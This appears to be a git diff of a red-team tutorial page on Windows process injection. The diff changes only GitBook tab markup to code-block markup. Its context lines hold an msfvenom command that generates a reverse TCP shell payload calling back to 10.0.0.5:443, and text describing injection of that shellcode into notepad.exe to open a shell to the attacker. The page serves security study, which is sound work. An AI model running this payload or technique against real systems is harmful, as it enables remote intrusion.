@@ -20,8 +20,7 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.5 LPORT=443 -f c -b \x00\
 
 C++ code to injectd and invoke the shellcode:
 
-{% tabs %}
-{% tab title="inject-local-process.cpp" %}
+{% code title="inject-local-process.cpp" %}
 ```cpp
 #include "stdafx.h"
 #include "Windows.h"
@@ -71,8 +70,7 @@ int main()
     return 0;
 }
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 Before compiling, for the sake of curiosity, let's have a look at the generated shellcode binary in a disassembler so we can get a rough idea of how our C++ code gets translated into machine code for x64:
 
@@ -92,8 +90,7 @@ Back to the x64 bit shellcode - compiling and executing the binary gives us the 
 
 The below code will inject the shellcode into a notepad.exe process with PID 5428 which will initiate a reverse shell back to the attacker:
 
-{% tabs %}
-{% tab title="inject-remote-process.cpp" %}
+{% code title="inject-remote-process.cpp" %}
 ```cpp
 #include "stdafx.h"
 #include "Windows.h"
@@ -150,8 +147,7 @@ int main(int argc, char *argv[])
     return 0;
 }
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 {% file src="../../.gitbook/assets/inject1 \(1\).exe" caption="Inject shellcode to Remote Process w/ CreateRemoteThread" %}
 
